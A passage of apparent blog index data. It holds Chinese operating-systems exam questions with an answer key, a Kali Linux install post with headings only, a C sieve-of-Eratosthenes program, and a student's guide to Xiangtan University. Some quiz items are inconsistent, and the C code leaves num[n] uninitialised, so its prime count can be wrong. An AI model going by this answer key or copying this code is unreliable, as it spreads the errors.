扩充外存空间的技术              D. 扩充输入输出缓冲区的技术 \n17.段页式存储管理汲取了页式管理和段式管理的长处，其实现原理结合了页式和段式管理的基本思想，即（B）。A. 用分段方法来分配和管理物理存储空间，用分页方法来管理用户地址空间。 \n​    B. 用分段方法来分配和管理用户地址空间，用分页方法来管理物理存储空间。 \n​    C. 用分段方法来分配和管理主存空间，用分页方法来管理辅存空间。 \n​    D. 用分段方法来分配和管理辅存空间，用分页方法来管理主存空间。\n18.（B）是指将作业不需要或暂时不需要的部分移到外存，让出内存空间以调入其他所需数据。​    A. 覆盖技术                        B. 交换技术\n​    C. 虚拟技术                        D. 物理扩充\n19.通道是一种（C）。A. I&#x2F;O端口                          B. 数据通道   \nC. I&#x2F;O专用处理机                    D. 软件工具\n1.下面各项中， (C  ) 不是引入操作系统的最主要目的。A.方便用户使用             B.更有效地利用软.硬件资源\nC.及时响应用户请求           D.改善系统性能\n2.分时系统响应时间与(  D)有关。A.每个应用进程分配的时间片长度     B.进程大小\nC.就绪进程数目             D.就绪进程数目和时间片长度\n3.采用多道程序设计能( B )。A.增加平均周转时间         B.发挥并提高并行工作能力\nC.缩短每道程序的执行时间      D.降低对处理器调度的要求\n4.下面对进程的描述中，错误的是( D )。 A.进程是动态的概念    B.进程执行需要处理机\n C.进程是有生命期的    D.进程是指令的集合\n5.多道程序系统中，当( B )时，进程从执行状态转变为就绪状态。A.进程被进程调度程序选中      B.时间片到\nC.等待某一事件           D.等待的事件发生\n6.下列选项中，导致创建新进程的操作是( C )。I 用户登录成功           II 设备分配     III启动程序执行\nA.仅I和II     B.仅II和III    C.仅I和III     D.I II和III\n7.下列因素中，( C  )不一定是引起进程调度的因素。   A.一个进程运行完毕        B.运行进程被阻塞 \n  C.一个高优先级进程被创建     D.实时调度中，一个紧迫的任务到来\n8.一种既有利于短小作业又兼顾到长作业的作业调度算法是( C  )。A.先来先服务   B.轮转      C.最高响应比优先 D.均衡调度\n9. “死锁”问题的讨论是针对(  D )的。A.某个进程申请系统中不存在的资源\nB.某个进程申请资源数超过了系统拥有的最大资源数\nC.硬件故障\nD.多个并发进程竞争独占型资源\n10.采用资源剥夺法可以解除死锁，还可以采用(B   )方法解除死锁。A.执行并行操作           B.撤消进程\nC.拒绝分配新资源          D.修改信号量\n11.下列对重定位的叙述中，正确的选项是( B  )。A.经过静态重定位后，指令代码并不发生变化\nB.经过静态重定位后，数据地址和指令地址发生了变化\nC.经过动态重定位后，数据地址和指令地址都发生了变化\nD.经过动态重定位后，数据地址发生了变化而指令地址没有发生变化\n12.将主存空闲区按地址顺序从小到大登记在空闲区表中，每次分配时总是顺序查找空闲区表，此种分配算法称为(   A)分配算法。A.最先适应    B.最优适应    C.最坏适应    D.随机适应\n13.某系统采用页式存储管理策略，拥有逻辑地址空间32页，每页2K，拥有物理空间1M，进程的页表有（  B）项A.16       B.32       C.48       D.96\n14.在段式存储管理的地址转换时，若段内地址大于段表中该段的长度，则发生（  D）。A.缺页中断             B.溢出中断\nC.硬件故障中断           D.地址越界中断\n15.在I&#x2F;O设备控制的发展过程中，最主要的推动因素是(  C )。A.提高资源利用率        B.提高系统吞吐量\nC.减少主机对I&#x2F;O控制的干预   D.提高CPU与I&#x2F;O设备的并行操作程度\n16.用户程序发出磁盘I&#x2F;O请求后，系统的正确处理流程是(   B)。A.用户程序→系统调用处理程序→中断处理程序→设备驱动程序\nB.用户程序→系统调用处理程序→设备驱动程序→中断处理程序\nC.用户程序→设备驱动程序→系统调用处理程序→中断处理程序\nD.用户程序→设备驱动程序→中断处理程序→系统调用处理程序\n17.逻辑文件的组织结构是由( C  )确定的。A.操作系统    B.存储容量    C.用户      D.文件长度\n18.在文件的物理结构中，(  A )结构不利于文件长度的动态增长。A.顺序      B.链接      C.索引      D.Hash\n19.文件系统中文件被按照名字存取是为了（ B ）。A.方便操作系统对信息的管理     B.方便用户的使用\nC.确定文件的存取权限        D.加强对文件内容的保密\n20.设文件F1当前引用计数值为1，先建立F1的符号链接(软链接)文件F2，再建立F1的硬软链接文件F3，然后删除F1。此时，F2和F3的引用计数值分别是（B  ）。A.0，1 B.1，1   C.1，2     D.2，1\n21.多道批处理系统的主要缺点是(C  )。  A.CPU利用率低    B.不能并发执行   C.缺少交互性   D.以上都不是\n22.下列选项中，操作系统提供给应用程序的接口是( A ) 。   A.系统调用      B.中断      C.库函数      D.原语\n23.多道程序设计是指(C  )。A.在多台处理机上同时执行多道程序  B.在多台处理机上同一时刻执行多道程序\nC.在一台处理机上同时执行多道程序  D.在一台处理机上同一时刻执行多道程序\n24.有关进程的下列叙述中，(D  )是正确的。A.进程是静态的文本         B.进程与程序是一一对应的\nC.进程与作业是一一对应的      D.多个进程可以在单个CPU上同时执行\n25.下列的进程状态变化中，( C )的变化是不可能发生的。A.运行→就绪   B.运行→等待   C.等待→运行  D.等待→就绪\n26.下面所述步骤中，( A )不是创建进程所必需的。  A.由调度程序为进程分配CPU   B.建立一个进程控制块\n  C.为进程分配内存        D.将进程控制块链入就绪队列\n27.下列各项中，不是进程调度时机的是(   D)。A.现运行的进程正常结束或异常结束  B.现运行的进程从运行态进入就绪态\nC.现运行的进程从运行态进入等待态  D.有一进程从等待态进入就绪态\n28.在作业调度中，排队等待时间最长的作业被优先调度，这是指(  A )调度算法。A.先来先服务            B.短作业优先\nC.响应比高优先           D.优先级\n29.产生死锁的原因与( D  )有关。A.与多个进程竞争CPU        B.与多个进程释放资源\nC.仅由于并发进程的执行速度不当  D.除资源分配策略不当外，也与并发进程执行速度不当\n30.某计算机系统中有8台打印机，有k个进程竞争使用，每个进程最多需要3台打印机。该系统可能会发生死锁的k的最小值是( C  )。(最坏情况每bai个进程du卡2台，4个进程全部卡zhi死)\nA.2        B.3        C.4        D.5\n31.在虚拟内存管理中，地址变换机构将逻辑地址变换为物理地址，形成该逻辑地址的阶段是(  B )。A.编辑      B.编译      C.连接      D.装载\n32.在系统运行时，对于固定分区的存储管理方式，内存中能并发执行的作业的最大数量是(   )。A.用户确定的   B.可变的     C.不受限制的   D.固定的\n33.在操作系统的存储管理中，页式分配是（ A ）。A.把程序的逻辑空间和内存的物理空间按同样的尺寸分成若干页\nB.把作业按其所需空间分成若干页\nC.将内存的空闲空间分成若干页\nD.随机地将每个作业的地址空间分成大小相同的若干页\n34.在段式存储管理中，下列哪个说法是正确的（ A ）。A.以段为单位分配，每一段是一个连续存储区    B.段与段之间必定不连续\nC.段与段之间必定连续              D.每段是等长的\n35.I&#x2F;O系统硬件结构分为4级：①设备控制器；②I&#x2F;O设备；③计算机；④I&#x2F;O通道。按级别由高到低的顺序是(   D)。A.②-④-①-③   B.③-①-④-②   C.②-①-④-③   D.③-④-①-②\n36.I&#x2F;O软件一般分为4个层次：用户层、与设备无关软件层、设备驱动程序、中断处理程序。以下工作中，不是由设备驱动程序完成的是(  C )。A.向设备寄存器写命令\nB.检查用户是否有权使用设备\nC.将二进制整数转换成ASCII码以便打印\nD.解释用户的I&#x2F;O请求，并将该请求转化为具体的I&#x2F;O操作\n37.以下关于文件组织结构的说法中，错误的是( C  )。A.文件组织从用户和文件系统的不同角度出发分为逻辑文件和物理文件\nB.逻辑文件是用户概念中的文件，分为流式文件和记录式文件\nC.磁带文件的物理组织方式一般可以采用顺序结构或链接结构\nD.磁盘文件的物理组织方式一般可以采用顺序结构、链接结构或索引结构等\n38.采用直接存取（随机存取）方法来读写磁盘上的物理记录时，效率最低的是(C   ) 。A.连续结构文件           B.索引结构文件\nC.隐式链接结构文件         D.显式链接结构文件\n39.文件系统采用多级目录结构可以（B  ）。A.节省存储空间           B.解决命名冲突\nC.缩短文件传送时间         D.减少系统开销\n40.以下（ B ）不是磁盘存储空间的常用管理方法。A.位示图     B.记录的成组操作    C.空闲块表  D.空闲块链\n41.从用户的观点看，操作系统是(  A)。A.用户与计算机之间的接口          B.控制和管理计算机系统的资源\nC.合理组织计算机工作流程          D.一个大型的工具软件\n42.下列选项中，在用户态执行的是(A  ) 。A.命令解释程序           B.缺页处理程序\nC.进程调度程序           D.时钟中断处理程序\n43.在计算机系统中，允许多个程序同时进入内存并运行，这种方法称为( D )。A.SPOOLing技术           B.虚拟存储技术\nC.缓冲技术             D.多道程序设计技术\n44.一个进程是( C )。A.由协处理器执行的一个程序     B.一个独立的程序 + 数据集\nC.PCB结构.程序和数据的集合     D.一个独立的程序\n45.如果单CPU系统中有n个并发进程，则就绪队列中进程个数最多可达(B  )个。A.n        B.n-1       C.n-2       D.1\n46.通常，用户进程被建立后，( B )。 A.便一直存在于系统中，直到被操作人员撒消 \n B.随着作业运行正常或不正常结束而撒消  \n C.随着时间片轮转而撒消与建立  \n D.随着进程的阻塞或唤醒而撒消与建立\n47.支持多道程序设计的操作系统在运行过程中，不断地选择新进程运行来实现CPU的共享，下列选项中，(D   )不是引起操作系统选择新进程的直接原因。A.运行进程的时间片用完       B.运行进程出错\nC.运行进程要等待某一时件发生    D.有新进程进入就绪状态\n48.分时系统中进程调度算法通常采用( B  )。A.响应比高者优先          B.时间片轮转法\nC.先来先服务            D.短作业优先\n49.在操作系统中，所谓“死锁”是指( B  )。A.程序死循环   B.多个进程彼此等待资源而不能前进的状态\nC.硬件故障    D.时间片太短，进程的调进调出太频繁而效率太低\n50.在多进程的并发系统中，肯定不会因竞争(   D)而产生死锁。A.打印机     B.磁带机     C.磁盘      D.CPU\n51.把目标程序中的逻辑地址转换成主存空间的物理地址称为(   B)。A.存储分配    B.地址重定位   C.地址保护    D.程序移动\n52.在下述存储管理方案中，( D  )管理方式要求作业的逻辑地址与占有主存的存储区域都是连续的。A.段页式      B.页式       C.段式       D.可变分区\n53.页式存储管理中，每次从主存中取指令或取操作数，当读快表失败时，要读（B  ）次主存。A.1        B.2        C.3        D.4\n54.采用段页式存储管理，在CPU中应设置（  A）寄存器。A.段表和页表控制 B.段表控制    C.页表控制    D.界地址\n55.硬件采用了中断和通道技术，使得( B  )。 A.CPU与外设能紧密结合        B.CPU与外设能并行工作\n C.CPU速度提高            D.外设速度提高\n56.程序员利用系统调用打开I&#x2F;O设备时，通常使用的设备标识符是(A   )。A.逻辑设备名   B.物理设备名   C.主设备号    D.从设备号\n57.下列选项中，(  B )不是删除文件所需要完成的工作。A.释放文件所占用的存储空间\nB.对文件原占用的存储单元全部清零\nC.删除该文件的目录项，即文件控制块(FCB)\nD.若文件为共享文件，还要对共享设置进行处理\n58.下列文件物理结构中，适合随机访问且易于文件扩展的是( B  )。A.连续结构             B.索引结构\nC.链式结构且磁盘块定长        D.链式结构且磁盘块变长\n59.不包含在文件控制块（又称文件目录项）中的信息是 （AA  ）。A.存储介质标志           B.文件名\nC.存取控制信息           D.文件的物理结构\n60.某操作系统的文件系统中，采用3个字节表示磁盘块号，每个磁盘块大小为512字节。该系统中每个（逻辑）磁盘允许的最大容量是（ C ）字节。A.2G  B.4G  C.8G  D.16G\n答案：1.C   2.D   3.B   4.D   5.B\n\n 6.C   7.C   8.C   9.D  10.B\n\n11.B  12.A  13.B  14.D  15.C\n\n16.B  17.C  18.A  19.B  20.B\n\n21.C  22.A  23.C  24.D  25.C\n\n26.A  27.D   28.A  29.D  30.C\n\n31.B  32.D  33.A  34.A  35.D\n\n36.C  37.C  38.C  39.B  40.B\n\n41.A   42.A  43.D  44.C   45.B\n\n46.B   47.D  48.B   49.B  50.D\n\n51.B  52.D  53.B   54.A  55.B\n\n56.A  57.B  58.B   59.A  60.C\n\n1、试说明进程在三个基本状态之间转换的典型原因。答案：（1）就绪状态→执行状态：进程分配到CPU资源 （2）执行状态→就绪状态：时间片用完 （3）执行状态→阻塞状态：I&#x2F;O请求 （4）阻塞状态→就绪状态：I&#x2F;O完成 \n2、什么是基于顺序搜索的动态分区分配算法？它可分为哪几种？答案：为了实现动态分区式分配，将系统中的空闲分区组织成空闲分区表或空闲分区链。所谓顺序搜索，是指按表或链的组织顺序，检索表或链上记录的空闲分区，去寻找一个最符合算法的、大小能满足要求的分区。 \n分区存储管理中常采用的分配策略有：首次适应算法、循环首次适应算法、最佳适应算法、最坏适应算法。\n3、试说明低级调度的主要功能。答案：（1）保存处理机的现场信息（2）按某种算法选取进程（3）把处理机分配给进程。\n4、试从动态性，并发性和独立性上比较进程和程序?答案：(1)动态性是进程最基本的特性，表现为由创建而产生，由调度而执行，因得不到资源而暂停执行，由撤销而消亡。进程有一定的生命期，而程序只是一组有序的指令集合，是静态实体。\n(2)并发性是进程的重要特征，同时也是OS 的重要特征。引入进程的目的正是为了使其程序能和其它进程的程序并发执行，而程序是不能并发执行的。\n(3)独立性是指进程实体是一个能独立运行的基本单位，也是系统中独立获得资源和独立调度的基本单位。对于未建立任何进程的程序，不能作为独立单位参加运行。\n5、实现虚拟存储器需要哪些硬件支持？答案：\n（1）请求分页（段）的页（段）表机制\n（2）缺页（段）中断机构\n（3）地址变换机构\n6、引入缓冲的主要原因是什么？答案：\n缓和CPU与I&#x2F;O设备之间速度不匹配的矛盾；\n减少对CPU的中断频率；\n放宽对中断响应时间的限制；\n解决数据力度不匹配的问题；\n提高CPU和I&#x2F;O设备之间的并行性。\n7、处理机管理有哪些主要功能？其主要任务是什么？答案：处理机管理的主要功能是：进程管理、进程同步、进程通信和处理机调度； 进程管理：为作业创建进程，撤销已结束进程，控制进程在运行过程中的状态转换。 进程同步：为多个进程（含线程）的运行进行协调。进程 通信：用来实现在相互合作的进程之间的信息交换。 处理机调度： （1）作业调度。从后备队里按照一定的算法，选出若干个作业，为他们分配运行所需的资源。（2）进程调度：从进程的就绪队列中，按照一定算法选出一个进程，把处理机分配给 它，并设臵运行现场，使进程投入执行。\n8、虚拟存储器有哪些特征？其中最本质的特征是什么？答案：虚拟存储器有多次性、对换性、虚拟性三大特征。最本质的特征是虚拟性。\n9、文件系统的模型 可分为三层，试说明其每一层所包含的基本内容。答案：第一层：对象及其属性说明（文件、目录、硬盘或磁带存储空间）； \n第二层：对对象操纵和管理的软件集合（I&#x2F;O控制层即设备驱动程序、基本文件系统即物理I&#x2F;O层、基本I&#x2F;O管理程序或文件组织模块层、逻辑文件系统层） 第三层：文件系统接口（命令接口&#x2F;图形化用户接口与程序接口）。\n10、文件管理有哪些主要功能？其主要任务是什么？答案：文件管理主要功能：文件存储空间的管理、目录管理、文件的读（写）管理和保护。 文件管理的主要任务：管理用户文件和系统文件，方便用户使用，保证文件安全性。\n11、试从调度性、并发性、拥有资源性及系统开销方面对进程和线程进行比较。答案： a. 调度性。在传统的操作系统中，拥有资源的基本单位和独立调度、分派的基本单位都是进程，在引入线程的OS中，则把线程作为调度和分派的基本单位，而把进程作为资源拥有的基本单位； b. 并发性。在引入线程的OS中，不仅进程之间可以并发执行，而且在一个进程中的多个线程之间，亦可并发执行，因而使OS具有更好的并发性； c. 拥有资源。无论是传统的操作系统，还是引入了线程的操作系统，进程始终是拥有资源的一个基本单位，而线程除了拥有一点在运行时必不可少的资源外，本身基本不拥有系统资源，但它可以访问其隶属进程的资源； d. 开销。由于创建或撤销进程时，系统都要为之分配和回收资源，如内存空间等，进程切换时所要保存和设置的现场信息也要明显地多于线程，因此，操作系统在创建、撤消和切换进程时所付出的开销将显著地大于线程。\n12、与文件系统有关的软件可分为哪几个层次？答案：一般地，把与文件系统有关的软件分为四个层次：\n\nI&#x2F;O控制层，是文件系统的最低层，主要由磁盘驱动程序等组成，也可成为设备驱动程序层\n基本文件系统层，主要用于处理内存与磁盘之间数据块的交换。\n基本I&#x2F;O管理程序，该层用于完成与磁盘I&#x2F;O有关的事务，如将文件逻辑块号转换为物理块号，管理磁盘中的空闲盘块，I&#x2F;O缓冲的指定等。\n逻辑文件系统，用于处理与记录和文件相关的操作，如允许用户和应用程序使用符号文件名访问文件及记录，实现对文件的记录和保护等。\n\n13.简述操作系统的基本特征和功能。答：基本特征：并发、共享、异步、虚拟。\n  功能：处理机管理、存储器管理、设备管理、文件管理、用户接口。\n14.试比较进程与程序的差异。答：（1）程序是一个静态概念，而进程是一个动态概念，是程序的一次执行；\n （2）进程具有并行特性，而程序没有；\n  （3）进程和程序不是一一对应的，一个程序可对应多个进程；一个进程可以执行一个或几个程序。\n\n某进程调度程序采用基于优先数(priority)的调度策略，即选择优先数最小的进程运行，进程创建时由用户指定一个nice作为静态优先数。为了动态调整优先数，引入运行时间cpuTime和等待时间waitTime，初值均为0。进程处于执行态时，cpuTime定时加1，且waitTime置0；进程处于就绪态时，cpuTime置0，waitTime定时加1。请回答下列问题。\n\n(1)若调度程序只将nice的值作为进程的优先数，即priority&#x3D;nice，则可能会出现饥饿现象，为什么?\n(2)使用nice、cpuTime和waitTime设计一种动态优先数计算方法，以避免产生饥饿现象，并说明waitTime的作用。\n答：（1）由于采用了静态优先数，当就绪队列中总有优先数较小的进程时，优先数较大的进程一直没有机会运行，因而会出现饥饿现象。\n（2）优先数的计算公式为：\npriority&#x3D;nice+k1cpuTime- k2waitTime,其中k1&gt;0, k2&gt;0。waitTime可使长时间等待的进程的优先数减少。\n\nSPOOLing系统由哪几部分组成？以打印机为例说明如何利用SPOOLing技术实现多个进程对打印机的\n\n答 组成：(1)输入井和输出井,(2)输入和输出缓冲区,(3)输入(收容)进程SPi 和输出(提取)进程Spo。\n当用户进程请求打印输出时， SPOOLing系统同意为它打印输出， 但并不真正立即把打印机分配给该用户进程， 而只为它做两件事： ① 由输出进程在输出井中为之申请一个空闲磁盘块区， 并将要打印的数据送入其中； ② 输出进程再为用户进程申请一张空白的用户请求打印表，并将用户的打印要求填入其中， 再将该表挂到请求打印队列上。\n当打印机空闲，输出进程将从请求打印队列的对首取出一张请求打印表，根据表中的要求将打印的数据从输出井传送到内存缓冲区，再由打印机打印….。\n20.一个例子的形式讲解逻辑地址到物理地址的转换：某虚拟存储器的用户编程空间共32个页面，每页为1KB，内存为16KB。假定某时刻一用户页表中已调入内存的页面的页号和物理块号的对照表如下：\n\n\n\n页号\n物理块号\n\n\n\n0\n3\n\n\n1\n7\n\n\n2\n11\n\n\n3\n8\n\n\n则逻辑地址0A5C(H)所对应的物理地址是什么？要求：写出主要计算过程。 \n****解题过程****：\n​    首先要知道页式存储管理的逻辑地址分为两部分：页号和页内地址。物理地址分为两部分：\n关系为：逻辑地址＝　页号＋页内地址\n​           物理地址＝　块号＋页内地址；\n分析题：已知：用户编程空间共３２个页面，２ˆ５　＝　３２　得知页号部分占５位，由“每页为1KB”，1K&#x3D;2^10，可知内页地址占10位。\n由“内存为16KB”，２^４＝１６得知块号占4位。\n​    逻辑地址0A5C（H）所对应的二进制表示形式是：００００１０１００１０１１１００，后十位１００１０１１１００是页内地址，\n０００１０为为页号，页号化为十进制是２，在对照表中找到２对应的物理块号是１１,１１转换二进制是１０１１，即可求出物理地址为１０１１１００１０１１１００，化成十六进制为２Ｅ５Ｃ；\n即则逻辑地址0A5C(H)所对应的物理地址是２Ｅ５Ｃ；\n15：分页技术例题\n\n\n参考文章:\n操作系统中的中断（详细介绍+图片理解）\n操作系统13————存储器管理之分页存储\n操作系统14————存储器管理之分段存储&amp;段页存储\n操作系统选择题\n","slug":"操作系统习题知识点","date":"2020-12-07T10:47:00.000Z","categories_index":"学习笔记","tags_index":"操作系统","author_index":"kif"},{"id":"3117370124352cd5a86df0b68c224fcb","title":"Kali linux Vmware安装","content":"一、kalilinux下载\n\n根据电脑配置选择合适的版本，在这里我选择的是64位版本，\n二、vmware安装打开VMware 创建适合KALI的虚拟机，使用自定义的配置方法，点击下一步\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n三、激活\n\n\n语言设置汉语就可\n\n\n\n\n\n\n\n\n\n\n\n\n\n","slug":"Kali-linux-Vmware安装","date":"2020-12-05T13:20:00.000Z","categories_index":"学习笔记","tags_index":"kali,linux","author_index":"kif"},{"id":"967c79636de7d94383bc9a503d949682","title":"埃式筛法","content":"做法：做法其实很简单，\n首先将2到n范围内的整数写下来，其中2是最小的素数。将表中所有的2的倍数划去，表中剩下的最小的数字就是3，他不能被更小的数整除，所以3是素数。再将表中所有的3的倍数划去……以此类推，如果表中剩余的最小的数是m，那么m就是素数。然后将表中所有m的倍数划去，像这样反复操作，就能依次枚举n以内的素数，这样的时间复杂度是O(nloglogn)。\n#include &lt;stdio.h&gt;\nint fun(int n);\n\nint main() &#123;\n\tint n;\n\tscanf(&quot;%d&quot;, &amp;n);\n\n\tint ans &#x3D; fun(n);\n\tprintf(&quot;%d\\n&quot;, ans);\n\n\treturn 0;\n&#125;\n\nint fun(int n) &#123;\n\t&#x2F;&#x2F;all 素数\n\t&#x2F;&#x2F;筛除\n\tint num[n + 1];\n\tint i;\n\tint count &#x3D; 0;\n\tfor (i &#x3D; 0; i &lt; n; i++) &#123;\n\t\tnum[i] &#x3D; 1;\n\t&#125;\n\tnum[0] &#x3D; 0;\n\tnum[1] &#x3D; 0;\n\tint j;\n\tfor (j &#x3D; 2; j &lt;&#x3D; n; j++) &#123;\n\t\tif (num[j] &#x3D;&#x3D; 1) &#123;\n\t\t\tcount++;\n\t\t\tint x;\n\t\t\tfor (x &#x3D; 2 * j; x &lt;&#x3D; n; x &#x3D; x + j) &#123;\n\t\t\t\tnum[x] &#x3D; 0;\n\t\t\t&#125;\n\n\t\t&#125;\n\t&#125;\n\treturn count;\n&#125;\n\n","slug":"埃式筛法","date":"2020-11-30T14:01:00.000Z","categories_index":"","tags_index":"C","author_index":"kif"},{"id":"f666554cbe0f3af858b970d721636c83","title":"高考季：我来给你说说湘潭大学","content":"&#x3D;&#x3D;_前排提示：_本文是从一个在湘大学习一年（准确说是半年吧）的学生角度介绍下湘潭大学，受众主要是想了解湘大的或者想考湘大的同学 ，属于个人介绍，个人见解，&#x3D;&#x3D;\n官方介绍：湘潭大学是湖南省与教育部、国家国防科工局共建的综合性全国重点大学，入选两期国家“中西部高校基础能力建设工程”，是全国首批具有硕士学位授予权的单位，教育部本科教学工作水平评估“优秀”学校，历年来全国一本招生高校。软科点评：主席倡办亲提校名，工材化学发展迅速。\n办学历史：湘潭大学是毛泽东主席亲自倡办、亲笔题写校名、亲切嘱托一定要办好的综合性全国重点大学；学校的建设发展，也得到了党中央、国务院和历代党和国家领导人的亲切关怀\n学科门类：学校学科覆盖文、史、哲、理、工、经、管、艺等9大门类。现有3个国家重点学科，4个国防特色学科，2个湖南省优势特色重点学科，19个湖南省重点学科；有15个一级学科博士点，110个二级二级学科博士点，31个一流学科硕士点，194个二级学科硕士点，13个硕士专业学位类别，11个博士后科研流动站；有11个专业排名全国前10%，国家级特色专业11个，国际级专业综合改革试点专业1个，6个专业通过国家工程教育认证。十大优势学科：马克思主义理论、法学、政治学、理论经济学、材料科学与工程、化学工程与技术、图书情报与档案管理、哲学、力学、工商管理。\n人才培养：学校设有拔尖人才培养教改实验班7个，包括数学类韶峰班、物理学类韶峰班、材料类师昌绪班、法学卓越班、经济学类韶峰班、公共管理类韶峰班、化学类韶峰班。学校为实验班配备一流师资，提供一流学习条件，创造一流学术氛围。2019届数学类韶峰班、物理学类韶峰班、材料类师昌绪班毕业生中76.8%被推荐免试攻读北京大学等双一流大学研究生。\n国际视野：学校与美国、英国等20多个国家和地区的60多所国际知名大学建立了广泛深入的校际交流合作关系；与西班牙莱昂大学、乌干达麦克雷雷大学合作共建了“&#x3D;&#x3D;孔子学院&#x3D;&#x3D;”；可以与美国、日本、韩国等国家知名大学生互派交换生。\n校园环境：学校是“全国绿化模范单位”、“湖南省文明单位”、“湖南省文明高校”、湖南省“十佳书香校园”。学生宿舍全部安装有空调，智慧校园实现无线WIFI全覆盖。\n个人了解外界宣传相信很多同学（尤其我这样属于西部偏远地区的孩子）对湘潭大学了解很少，甚至没有听说过。我在高考完填报志愿的时候是根据志愿填报机构的大数据推荐才把它填上志愿的。当时十几个志愿学校（有同学可能惊讶怎么十几个志愿，这是因为还有国家专项、地方专项、高校专项这些）只有两个省外的，湘大就是其中之一，按分数作为第二志愿我被湘大录取了。于是，这个时候我才开始在各大网站上了解湘大。湘大在外界并没有很多人知道，因为它既不是985也不是211，目前也不是双一流，它是省属普通一本中的战斗机，推免率最高的普通一本，超一本线不多的考生性价比高校考虑之一。是重点大学中比较可以的一所高校，综合实力强于绝大部分省属普通一本，最值得读的专业是数学类、法学类、经管类。在与湖南本地的同学交流后发现在湖南名声还可以，但学校在其他地方的宣传还有待加强，这样才有助于其他地方的同学对它有更多的了解。而在各大社交平台上也有很多人对湘大进行了评价，有兴趣的同学也可以去看看。近一年的生活之后，我个人对湘大也有了很大态度上的改变。\n分数陕西本科一批历年分数（数据来源：中国教育在线）\n\n\n年份\n最高分\n最低分\n最低位次\n平均分\n\n\n\n2019\n563\n521\n31815\n539\n\n\n2018\n–\n531\n25894\n—-\n\n\n2017\n–\n501\n26955\n–\n\n\n2016\n–\n–\n–\n525\n\n\n\n陕西本科一批各专业分数线（部分，数据来源：中国教育在线）\n\n\n专业\n最高分\n最低分\n最低位次\n\n\n\n数学类（韶峰班）\n563\n557\n18396\n\n\n物理学类（韶峰班）\n554\n553\n19660\n\n\n会计学（ACCA班）\n553\n552\n19982\n\n\n计算机科学与技术\n559\n548\n21352\n\n\n软件工程\n553\n548\n21352\n\n\n数学类\n555\n546\n22045\n\n\n材料类（师昌绪班）\n547\n544\n22789\n\n\n网络工程\n545\n541\n23888\n\n\n经济学类（韶峰班）\n555\n552\n19982\n\n\n\n其余省份历年分数中国教育在线 湘潭大学分数线\n由分数大家应该可以看出来考着个分数的大多数同学其实是高考有失误，如果你是一个高考生，高考分数离大城市的985 211有点距离，那湘潭大学一定是你最好的本一选择，不接受反驳！哈哈哈。因为这个分数有点“高不成低不就”，这也就使得湘大的一部分同学刚来的时候是有一些抵触的。\n地域\n湘潭大学座落在毛泽东同志的故乡、中国历史文化名城——湖南省湘潭市。湖南省湘潭市雨湖区北二环羊牯塘街道。邮编号码是411105地级市经济一般 位置偏僻 远离省会繁华，适合潜心学习，湘大的发展相对缓慢与这地理因素有一定原因，但这并不意味着出去游玩有很多困难，近几年“长株潭”一体化建设的加强也使得出行各方面有很大便利，从南门做公交近一个小时可到达湘潭火车站，在做十几分钟的城际高铁便能到达长沙，我个人因为大一班委事情多，加上学业负担重，也就出去玩了一次，长沙美食啥的就不多赘述了。公交车半个小时应该能到市里，看个电影什么的，还是挺方便的。湘潭离长沙很近，高铁就二十分钟的事，看个演唱会，音乐节啥的都很方便。\n校园环境湘大的校园环境还是挺不错的，湘大校区集中，校园内部联系快捷、沟通方便，且不受外界喧闹干扰，具备特有的舒适幽静的学习、科研环境，是读书、治学的理想殿堂。学校是全国66所本科院校教育信息化试点单位之一。主干万兆的校园有线网络覆盖了所有教学、办公区域、学生公寓区和部分学生宿舍，无线网络覆盖所有教学、办公区域和学生公寓、宿舍区域和主要室外公共场所。 三道拱门湘潭大学的校门——三道拱门，建立于上世纪80年代初，是学校的标志性建筑。 简洁而不乏宏伟之气势，质朴而不失现代之灵光，三道拱门的整体设计融合了传统文化内涵和现代审美气息，具有独特丰富的内涵：1、它代表湘潭大学是文、理、工综合性大学，兆示着学校文、理、工多学科交叉发展的无限潜能；2、它蕴涵一生二，二生三，三生万物的传统哲学思想，隐含着学术自由、平等博爱、追求无极的理性思辨，彰显著知行合一、德才兼备、情理互融的育人理念；3、整体看三道拱门像汉字“山”，象征着不断进取、勇登高峰。每一道直达云际、顶端开启的拱门，宛如开启知识殿堂的钥匙，意味着在探求未知领域的过程中学习、研究永无止境；4、单看每一道拱门像汉字“人”，三道拱门代表三人成众、众志成城，突出团队合作精神；同时，“三人行，必有我师鄢”，意味着湘大人善于学习、不断进取的作风。\n\n食堂湘大有南苑、雅园、琴湖、北五、乐园、公一、兴湘7个食堂。7大食堂各有特色，南苑环境优美，现代化装修；琴湖菜品多样，好评如潮;乐园、雅园面食丰富……南苑公一北五极宜讨论问题、学习。还有联建小吃街 金翰林小吃街 堕落坑 三大小吃街，金陵汤包、上海生煎、陕西肉夹馍、麻辣烫、湘西泡菜、炸鸡甜品、臭豆腐、小龙虾、烧烤……南北中外,小食饮品，应有尽有。\n\n\n寝室湘大有琴湖，南苑，金翰林，北苑四个宿舍区。每间宿舍都有风扇空调，大部分寝室都有独立卫浴，楼道有洗衣机，饮水机但很多寝室也会选择合伙买一个洗衣机，热水是充足的，所以半夜两点起来泡泡面不是问题。寝室楼下一般都会有自动售货机，有双人，四人，六人，八人间几种。我所在的琴湖18栋本来是四人间，奈何19扩招吧，四人间魔改为八人间，这也是同学们比较难以接受的。但这一年又校区扩建，不知道能不能得到改善。宿舍不让使用大功率电器，但是大功率电器是2000w。吹风机，小电锅，你值得拥有。去年元旦我们寝室就在一起煮饺子（嘘!）。一般没有查寝，刷卡进宿舍楼，据说十一点半以后进寝室会有记录，但从来没管过哈哈哈。校园wifi说起来是晚上12.00断网，也有人吐槽网速慢，但我用着还可以。\n\n图书馆每到考试月的时候，这里总是座无虚席。大家可以在微信公众号“来选座”上面预定学习座位，但我只抢到过一次，湘大图书馆饱满到上了微博热搜，\n体育馆这个地方我渠道比较少，当时军训在这边，之后也就“新生杯篮球赛“去看过，里面挺大的，设施也齐全，有好多同学办了健身卡经常去锻炼。\n\n最后放一些平时收集的图片吧！\n最后！\n另附一份2020湘大招生简介：http://mp.weixin.qq.com/s?__biz&#x3D;MzUxNjQ4ODQ4Ng&#x3D;&#x3D;&amp;mid&#x3D;2247487965&amp;idx&#x3D;1&amp;sn&#x3D;755340e0fb9f9ade8721436d1a9938ae&amp;chksm&#x3D;f9a7fd94ced074822e8fe205b51e618eb5ac5cbf727a785a94ef14b1eccc136de19599ca8c2e&amp;mpshare&#x3D;1&amp;scene&#x3D;23&amp;srcid&#x3D;0720pKhXgFwuL0kqaov8YqHZ&amp;sharer_sharetime&#x3D;1595255579779&amp;sharer_shareid&#x3D;d439481da0998db784a4fe3429654f79#